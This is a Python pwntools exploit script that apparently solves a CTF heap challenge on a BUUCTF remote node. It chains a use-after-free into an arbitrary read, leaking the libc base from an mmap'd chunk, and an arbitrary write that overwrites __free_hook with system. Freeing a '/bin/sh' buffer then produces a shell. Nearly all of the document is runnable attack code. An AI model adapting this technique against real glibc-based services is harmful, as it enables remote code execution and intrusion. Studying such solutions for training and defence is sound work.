'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

Use After Free to any-addr read and write
Tcache attack to modify free_hook to system | Tcache is stack-like data structure
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "29461" 
filename = "./pwn"
elf = ELF(filename)
local_libc = '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6'
remote_libc = './libc.so.6'
libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B(tag=0):
    if tag: gdb.attach(io)
    pause()

def Add(idx, size, content):
    io.sendlineafter(b'>>\n', b'1')
    io.sendlineafter(b'idx(0~15): \n', str(idx).encode())
    io.sendlineafter(b'enter size: \n', str(size).encode())
    io.sendlineafter(b'write the note: \n', content)

def Del(idx):
    io.sendlineafter(b'>>\n', b'2')
    io.sendlineafter(b'idx(0~15): \n', str(idx).encode())

def Show(idx):
    io.sendlineafter(b'>>\n', b'3')
    io.sendlineafter(b'idx(0~15): \n', str(idx).encode())

def Edit(idx, content):
    io.sendlineafter(b'>>\n', b'4')
    io.sendlineafter(b'idx(0~15): \n', str(idx).encode())
    io.sendlineafter(b'enter content: \n', content)

def pwn():
    Add(0, 0x20, b'fa1c4')
    Add(1, 0x40000, b'fa1c4') # mmap
    Add(2, 0x20, b'fa1c4')
    Add(3, 0x20, b'fa1c4')

    Del(1) # free mmap {content_size, 0, 0, buf_pointer->mmap_addr}
    Del(2) # MGNote2->MGNote1
    # B(1)
    Add(4, 0x20, b'f'*24) # MGNote2->buf(MGNote1)
    # B()
    Show(4) # UAF AnyRead
    io.recvuntil(b'f'*24)
    libc.address = u64(io.recv(6) + b'\x00\x00') - 0x10 + 0x41000 # pagesize == 0x1000
    log.info(f'libc.address: {hex(libc.address)}')

    free_hook_addr = libc.sym['__free_hook']
    system_addr = libc.sym['system']
    log.info(f'free_hook_addr: {hex(free_hook_addr)}')
    log.info(f'system_addr: {hex(system_addr)}')
    # B(1)
    Edit(4, p64(0x40000) + p64(0) + p64(0) + p64(free_hook_addr)) # modify GMNote1->buf_pointer
    Edit(1, p64(system_addr)) # UAF AnyWrite | buf writing controlled by Note1
    Edit(4, b'/bin/sh\x00')
    # B(1)
    Del(1)


if __name__ == "__main__":
    pwn()
    io.interactive()
